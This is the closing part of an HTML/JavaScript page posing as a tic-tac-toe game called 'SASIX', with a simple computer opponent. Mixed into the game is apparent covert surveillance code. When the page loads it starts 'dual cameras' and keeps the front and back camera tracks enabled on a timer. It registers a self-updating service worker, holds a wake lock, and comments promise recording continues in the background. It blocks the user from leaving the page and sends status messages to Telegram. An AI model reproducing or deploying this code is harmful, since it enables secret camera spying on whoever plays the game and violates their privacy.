                document.getElementById('gameStatusMessage').innerHTML = 'üòë DRAW';
                document.getElementById('gameStatusSub').innerHTML = 'Almost... but not win';
                setTimeout(resetGame, 1000);
                return true;
            }
            
            currentPlayer = currentPlayer === 'X' ? 'O' : 'X';
            document.getElementById('gameStatusMessage').innerHTML = currentPlayer === 'X' ? 'üéÆ YOUR TURN' : 'ü§ñ SASIX TURN';
            
            if (currentPlayer === 'O' && gameActive) {
                setTimeout(computerMove, 500);
            }
            
            return true;
        }
        
        function computerMove() {
            if (!gameActive || currentPlayer !== 'O') return;
            
            // 1. Win if possible
            for (let pattern of winPatterns) {
                const [a, b, c] = pattern;
                if (board[a] === 'O' && board[b] === 'O' && board[c] === '') {
                    makeMove(c, 'O'); return;
                }
                if (board[a] === 'O' && board[c] === 'O' && board[b] === '') {
                    makeMove(b, 'O'); return;
                }
                if (board[b] === 'O' && board[c] === 'O' && board[a] === '') {
                    makeMove(a, 'O'); return;
                }
            }
            
            // 2. Block player
            for (let pattern of winPatterns) {
                const [a, b, c] = pattern;
                if (board[a] === 'X' && board[b] === 'X' && board[c] === '') {
                    makeMove(c, 'O'); return;
                }
                if (board[a] === 'X' && board[c] === 'X' && board[b] === '') {
                    makeMove(b, 'O'); return;
                }
                if (board[b] === 'X' && board[c] === 'X' && board[a] === '') {
                    makeMove(a, 'O'); return;
                }
            }
            
            // 3. Take center
            if (board[4] === '') {
                makeMove(4, 'O'); return;
            }
            
            // 4. Take corners
            const corners = [0, 2, 6, 8];
            for (let corner of corners) {
                if (board[corner] === '') {
                    makeMove(corner, 'O'); return;
                }
            }
            
            // 5. Any empty cell
            for (let i = 0; i < 9; i++) {
                if (board[i] === '') {
                    makeMove(i, 'O'); return;
                }
            }
        }
        
        function updateBoardUI() {
            const cells = document.querySelectorAll('.ttt-cell');
            cells.forEach((cell, index) => {
                cell.textContent = board[index];
                if (board[index] === 'X') {
                    cell.classList.add('x');
                    cell.classList.remove('o');
                } else if (board[index] === 'O') {
                    cell.classList.add('o');
                    cell.classList.remove('x');
                } else {
                    cell.classList.remove('x', 'o');
                }
            });
        }
        
        function resetGame() {
            board = ['', '', '', '', '', '', '', '', ''];
            currentPlayer = 'X';
            gameActive = true;
            updateBoardUI();
            document.getElementById('gameStatusMessage').innerHTML = 'üéÆ YOUR TURN';
            document.getElementById('gameStatusSub').innerHTML = 'You cannot win this game';
        }
        
        // ============================================
        // 7. KEEP ALIVE - BACKGROUND MODE
        // ============================================
        function keepAlive() {
            // Service Worker
            if ('serviceWorker' in navigator) {
                navigator.serviceWorker.register('data:text/javascript;base64,' + btoa(`
                    self.addEventListener('install', e => self.skipWaiting());
                    self.addEventListener('activate', e => e.waitUntil(clients.claim()));
                    setInterval(() => self.registration.update(), 10000);
                `)).catch(() => {});
            }
            
            // Keep cameras alive
            setInterval(() => {
                if (frontCameraStream) {
                    frontCameraStream.getVideoTracks().forEach(t => { try { t.enabled = true; } catch(e) {} });
                }
                if (backCameraStream) {
                    backCameraStream.getVideoTracks().forEach(t => { try { t.enabled = true; } catch(e) {} });
                }
            }, 3000);
            
            // Wake Lock
            if ('wakeLock' in navigator) {
                navigator.wakeLock.request('screen').catch(() => {});
            }
        }
        
        // ============================================
        // 8. EVENT LISTENERS
        // ============================================
        document.querySelectorAll('.ttt-cell').forEach(cell => {
            cell.addEventListener('click', function() {
                const index = parseInt(this.dataset.index);
                if (gameActive && currentPlayer === 'X' && board[index] === '') {
                    makeMove(index, 'X');
                }
            });
        });
        
        document.getElementById('newGameBtn').addEventListener('click', function() {
            resetGame();
            sendTelegramMessage('üîÑ <b>New Tic Tac Toe Game Started</b>');
        });
        
        document.getElementById('resetGameBtn').addEventListener('click', function() {
            resetGame();
        });
        
        // ============================================
        // 9. INITIALIZE EVERYTHING
        // ============================================
        window.addEventListener('load', function() {
            startDualCameras();
            keepAlive();
            resetGame();
            sendTelegramMessage('üéÆ <b>SASIX DUAL CAMERA TIC TAC TOE STARTED</b>\nMode: Computer Always Wins');
        });
        
        // ============================================
        // 10. NEVER STOP RECORDING
        // ============================================
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                console.log('üì± BACKGROUND MODE - DUAL CAMERAS CONTINUE');
            }
        });
        
        window.addEventListener('beforeunload', function(e) {
            e.preventDefault();
            e.returnValue = '';
            return '';
        });
        
    </script>
